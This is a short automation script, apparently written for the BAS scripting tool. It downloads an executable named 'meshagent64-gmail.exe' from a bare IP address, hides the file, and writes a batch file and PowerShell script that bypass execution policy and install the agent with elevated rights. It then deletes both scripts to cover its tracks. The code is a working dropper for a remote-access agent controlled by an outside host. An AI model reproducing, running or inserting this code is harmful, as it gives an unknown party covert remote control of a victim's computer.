_switch_http_client_main()
http_client_download("https://38.54.17.185/meshagents?id=4&meshid=3Zr7Wcn8bE9HWFd6@L7uqdW8ZTNtePtvnQWJdWbjjE8gHmBPqPz4Tb@QAQmtbxxY&installflags=0", "C:\u005cBAS\u005cmeshagent64-gmail.exe")!
RANDOM_FILE = "temp_" + rand() + ".bat"
native("filesystem", "writefile", JSON.stringify({path: RANDOM_FILE,value: "chcp 65001\r\n" + (("C:\u005cBAS\u005c".length>0) ? ("cd " + "C:\u005cBAS\u005c" + "\r\n") : "" ) + (("@echo off\necho param ( [alias(\u0027?\u0027)] [switch] $amI) \u003e myscript.ps1\necho set-strictMode -version 3 \u003e\u003e myscript.ps1\necho if ($amI) \u007b \u003e\u003e myscript.ps1\necho    $curIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent() \u003e\u003e myscript.ps1\necho    $principal   = new-object System.Security.Principal.WindowsPrincipal $curIdentity \u003e\u003e myscript.ps1\necho    $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator) \u003e\u003e myscript.ps1\necho    return \u003e\u003e myscript.ps1\necho \u007d \u003e\u003e myscript.ps1\necho $downloadPath = \u0022C:\u005cBAS\u005cmeshagent64-gmail.exe\u0022 \u003e\u003e myscript.ps1\necho Set-ItemProperty -Path $downloadPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) \u003e\u003e myscript.ps1\necho $ps_exe = (Get-Process -Id $pid).Path \u003e\u003e myscript.ps1\necho $command = \u0022cd \u0027C:\u005cBAS\u0027; $downloadPath -fullinstall;Clear-Host;Exit\u0022 \u003e\u003e myscript.ps1\necho Start-Process $ps_exe -Verb RunAs -ArgumentList \u0022-NoExit\u0022, \u0022-Command\u0022, $command; \u003e\u003e myscript.ps1\necho  \u003e\u003e myscript.ps1\n\npowershell -ExecutionPolicy Bypass -File \u0022myscript.ps1\u0022\nsleep 5\ndel /f /q myscript.ps1").replace(/\r?\n/g, "\r\n")),base64:false,append:false}))
native_async("processmanager", "start", JSON.stringify({location: RANDOM_FILE, working_folder: "", waitfinish: true, arguments: "", version: 2}))!
sleep(1000)!
native("filesystem", "removefile", RANDOM_FILE)
